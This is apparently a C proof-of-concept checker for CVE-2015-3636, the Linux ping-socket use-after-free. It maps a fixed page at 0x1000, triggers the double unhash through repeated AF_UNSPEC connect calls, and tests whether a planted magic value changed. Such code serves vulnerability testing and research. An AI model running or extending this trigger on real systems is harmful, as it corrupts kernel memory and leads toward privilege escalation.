#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <string.h>
#include <linux/in.h>
#include <unistd.h>
#include <arpa/inet.h>


#define MAGIC_BASE_ADDR 0x1000
#define MAGIC_ADDR 0x1360
#define MAGIC_NUM 0xdeadbeef
#define MEM_LEN 0x1000
#define TAG "CVE_2015_3636"
#define true 1
#define false 0
static int mapPrepare(){
	void *map;
	map =  mmap((void *)(MAGIC_BASE_ADDR),MEM_LEN,
	PROT_READ | PROT_WRITE,
	MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if(map!=(void *)MAGIC_BASE_ADDR)
		return false;
	*(unsigned int *)MAGIC_ADDR = MAGIC_NUM;
	return true;
}

static int socketConnect(){
	struct sockaddr sa;
	int ret;
	int fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
    if(fd==-1){
    	printf("socket create failed");
    	return false;
    }
	//hash sk
    memset(&sa,0,sizeof(sa));
    sa.sa_family = AF_INET;
    ret = connect(fd,&sa,sizeof(sa));
    //unhash sk
    memset(&sa,0,sizeof(sa));
    sa.sa_family = AF_UNSPEC;
    ret = connect(fd,&sa,sizeof(sa));
    ret = connect(fd,&sa,sizeof(sa));
    scanf("%d",&ret);
    //try to unhash sk
    close(fd);
    return true;
}

static int magicTest(){
	printf("%x",*(int *)0x1000);
	return (*(unsigned int *)MAGIC_ADDR == MAGIC_NUM);
}

static int CVE_2015_3636_BLOCK0(){
	if(!mapPrepare())
		 return -1;
	if(!socketConnect())
		 return -2;
	if(magicTest())
		return 0;
	else
		return 1;
}

int main(){
	printf("%d",CVE_2015_3636_BLOCK0());
	return 0;
}

